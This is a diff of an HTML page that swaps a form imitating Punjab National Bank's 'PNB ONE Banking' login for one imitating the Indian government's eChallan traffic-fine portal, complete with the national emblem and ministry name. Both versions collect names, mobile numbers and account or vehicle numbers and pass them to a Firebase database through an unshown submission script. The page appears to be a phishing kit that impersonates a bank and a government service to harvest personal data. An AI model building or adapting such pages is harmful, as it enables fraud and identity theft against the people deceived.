@@ -2,154 +2,112 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <title>PNBONEAPP</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-
-  <!-- Firebase SDKs -->
-  <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
-  <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
-
-  <!-- Firebase Config -->
-  <script src="firebase-config.js"></script>
-
-  <!-- Step 1 Submission Script -->
-  <script defer src="step1-script.js"></script>
-
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>eChallan Form</title>
   <style>
-    * {
-      box-sizing: border-box;
-    }
-
     body {
       font-family: Arial, sans-serif;
-      background-color: #f5f3f0;
       margin: 0;
-      padding: 20px;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      min-height: 100vh;
-    }
-
-    .form-container {
-      background-color: #fff;
-      padding: 30px;
-      border-radius: 10px;
-      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
-      width: 100%;
-      max-width: 450px;
-      border-top: 6px solid #800000;
-    }
-
-    .logo {
-      display: flex;
-      justify-content: center;
-      margin-bottom: 15px;
-    }
-
-    .logo img {
-      width: 160px;
-      max-width: 100%;
-      height: auto;
-    }
-
-    .welcome-text {
+      padding: 0;
+      background-color: #f9f9f9;
       text-align: center;
-      font-size: 16px;
-      color: #555;
-      margin-bottom: 4px;
     }
 
-    .main-heading {
-      text-align: center;
-      color: #800000;
-      font-size: 24px;
-      font-weight: bold;
-      margin-bottom: 25px;
+    .container {
+      margin: 30px auto;
+      max-width: 360px;
+      background-color: #e6f3ff; /* Light blue background */
+      padding: 25px;
+      border-radius: 15px;
+      box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.1);
     }
 
-    label {
-      display: block;
-      margin-bottom: 6px;
+    img.logo {
+      width: 60px;
+      margin-top: 20px;
+    }
+
+    h2 {
+      margin: 10px 0 0 0;
       font-weight: bold;
+    }
+
+    p {
+      margin: 5px 0 20px 0;
+      font-size: 14px;
       color: #333;
     }
 
-    input[type="text"],
-    input[type="tel"] {
-      width: 100%;
-      padding: 10px;
-      margin-bottom: 20px;
-      border: 1px solid #ccc;
-      border-radius: 5px;
-      font-size: 14px;
-    }
-
-    input[type="submit"] {
-      width: 100%;
-      background-color: #800000;
-      color: #fff;
-      border: none;
+    input {
+      width: 90%;
       padding: 12px;
+      margin: 10px 0;
+      border: 2px solid #cce0ff;
+      border-radius: 10px;
       font-size: 16px;
-      border-radius: 5px;
-      cursor: pointer;
-      transition: background-color 0.3s ease;
     }
 
-    input[type="submit"]:hover {
-      background-color: #a30000;
+    input:focus {
+      outline: none;
+      border-color: #007bff;
+      background-color: #e6f0ff;
     }
 
-    .notice {
-      margin-top: 20px;
+    button {
+      width: 95%;
       padding: 12px;
-      font-size: 12px;
-      color: #555;
-      background-color: #fef8e7;
-      border-left: 4px solid #ffcc00;
-      line-height: 1.5;
+      margin-top: 15px;
+      background-color: #0066ff;
+      color: white;
+      border: none;
+      border-radius: 10px;
+      font-size: 18px;
+      font-weight: bold;
+      cursor: pointer;
     }
 
-    @media (max-width: 500px) {
-      .form-container {
-        padding: 20px;
-      }
+    button:hover {
+      background-color: #0052cc;
+    }
 
-      .logo img {
-        width: 180px;
-      }
+    /* Capitalize vehicle number */
+    #cac {
+      text-transform: uppercase;
     }
   </style>
 </head>
 <body>
 
-  <div class="form-container">
-    <div class="logo">
-      <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSXyT6xYR0eSSB14wdrhfjvwt_9f84h6NJQPw&s" alt="PNB Logo" />
-    </div>
+  <!-- Top emblem -->
+  <img src="https://upload.wikimedia.org/wikipedia/commons/5/55/Emblem_of_India.svg" alt="India Emblem" class="logo" />
 
-    <div class="welcome-text">Welcome to</div>
-    <div class="main-heading">PNB ONE Banking</div>
+  <h2>eChallan</h2>
+  <p>Digital Traffic/Transport MoRTH,<br/>Government of India</p>
 
+  <!-- Form container with blue background -->
+  <div class="container">
     <form id="ududip007">
-      <label for="aname">Name:</label>
-      <input type="text" id="aname" placeholder="Enter your full name" required />
-
-      <label for="bmobile">Mobile Number:</label>
-      <input type="tel" id="bmobile" maxlength="10" placeholder="Enter your mobile number" required oninput="this.value = this.value.replace(/[^0-9]/g, '')" />
-
-      <label for="cac">Account Number:</label>
-      <input type="text" id="cac" maxlength="16" placeholder="Enter your account number" required oninput="this.value = this.value.replace(/[^0-9]/g, '')" />
-
-      <input type="submit" value="Proceed" />
+      <input type="text" id="aname" name="fullname" placeholder="Full Name" required />
+      <input type="tel" id="bmobile" name="mobile" placeholder="Mobile Number" pattern="[0-9]{10}" required />
+      <input type="text" id="cac" name="vehicleNumber" placeholder="Vehicle Number" required />
+      <button type="submit">Proceed</button>
     </form>
-
-    <div class="notice">
-      <strong>IMPORTANT:</strong> In our constant endeavor to give you better service and user experience, we have enhanced our Internet Banking site. You may feel changes in the User Interface (look and feel). Please change your password regularly and keep your computer protected and updated with latest Antivirus and patches. Please do not click on any hyperlinks to reach to our site, but type our site address <strong>http://netpnb.com/</strong><br /><br />
-      <em>[Best viewed in IE version 9 and above, Mozilla Firefox 34 and above, Google Chrome 40 and above and Safari 7 and above with resolution in 1024 x 768.143-DC]</em>
-    </div>
   </div>
+
+  <!-- Bottom image, responsive -->
+  <img src="https://www.jagranimages.com/images/newimg/25052024/25_05_2024-e_challan_23725058.webp" 
+       alt="Challan Image" 
+       style="width: 100%; max-width: 500px; height: auto; margin: 20px auto; display: block;" />
+
+  <!-- Firebase SDKs -->
+  <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+
+  <!-- Firebase Config (Make sure this file contains your actual Firebase config) -->
+  <script src="firebase-config.js"></script>
+
+  <!-- Submission Script -->
+  <script defer src="step1-script.js"></script>
 
 </body>
 </html>
